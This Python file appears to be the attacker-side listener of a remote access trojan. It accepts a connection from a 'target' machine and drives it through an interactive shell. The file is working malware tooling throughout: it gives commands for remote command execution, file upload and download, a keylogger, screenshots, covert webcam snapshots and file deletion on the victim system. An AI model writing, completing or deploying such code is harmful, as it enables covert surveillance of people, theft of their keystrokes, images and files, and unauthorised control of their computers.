import socket
import json
import os
import datetime
import time



def reliable_send(data):    
    jsondata = json.dumps(data)
    target.send(jsondata.encode())


def reliable_recv():
    data = ''
    while True:
        try:
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def upload_file(file_name):
    f = open(file_name,'rb')
    target.send(f.read())

def download_file(file_name):
    try:
        with open(file_name, 'wb') as f:
            target.settimeout(1)
            while True:
                try:
                    chunk = target.recv(1024)
                    if not chunk:
                        break
                    f.write(chunk)
                except socket.timeout:
                    break
        print(f"File '{file_name}' downloaded successfully.")
    except socket.error as e:
        print(f"Socket error: {e}")
    except FileNotFoundError:
        print(f"File '{file_name}' not found.")
    except Exception as e:
        print(f"Error downloading file: {e}")
    finally:
        target.settimeout(None)

def help_commands():
    options = {
        'quit': 'Quit the session',
        'help': 'Show this help message',
        'cd <directory>': 'Change directory on target system',
        'clear': 'Clear the terminal screen',
        'download <file_name>': 'Download a file from the target system',
        'upload <file_name>': 'Upload a file to the target system',
        'start-keylogger': 'Start the keylogger on the target system',
        'stop-keylogger <file_name>': 'Stop the keylogger and save the log to a file on the target system',
        'delete-file <file_name>': 'Delete a file on the target system',
        'screenshot': 'Takes screenshot of targets screen',
        'webcam-snap': 'snaps a picture throght the targets web-cam'
    }
    print("Available commands:")
    for command, description in options.items():
        print(f"{command:20}: {description}")

def take_screenshot():
    current_time = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M")
    screenshot_name = f"screenshot_{current_time}.png"
    download_file(screenshot_name) 
    print("Screenshot has been captured")

def webcam_snapshot():
    current_time = datetime.datetime.now().strftime("%Y-%m-%d_%H-%M")
    filename= f"webcam-capture_{current_time}.jpg"
    time.sleep(10)
    download_file(filename)
    print("webcam snapshot has been captured")



def target_communication():
    while True:
        command = input('* Shell~%s: ' % str(ip))
        reliable_send(command)

        if command == 'quit':
            target.close()
            break

        elif command == "help":
            help_commands()

        elif command[:3] == 'cd ':
            pass
        
        elif command == 'clear':
            os.system('clear')

        elif command[:8] == 'download':
            download_file(command[9:])

        elif command[:6] == 'upload':
            upload_file(command[7:])
        
        elif command == 'start-keylogger':
            print("Started keylogger.")
            pass

        elif command[:14] == 'stop-keylogger':
            #this stops the keylogger and downloads the file automatically and send the file over
            download_file(command[15:])
            text =reliable_recv()
            print(text)
            print("stopped Keylogger")

        elif command[:11] == 'delete-file':
            pass
        
        elif command == 'screenshot':
            take_screenshot()

        elif command == 'webcam-snap':
            webcam_snapshot()

        else:
            result = reliable_recv()
            print(result)




sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('127.0.0.1', 5555))
print('[+] Listening For The Incoming Connections')
sock.listen(5)
target, ip = sock.accept()
print('[+] Target Connected From: ' + str(ip))
try:
    target_communication()
except KeyboardInterrupt:
        print("\nKeyboardInterrupt detected. Closing socket.")
        target.close()
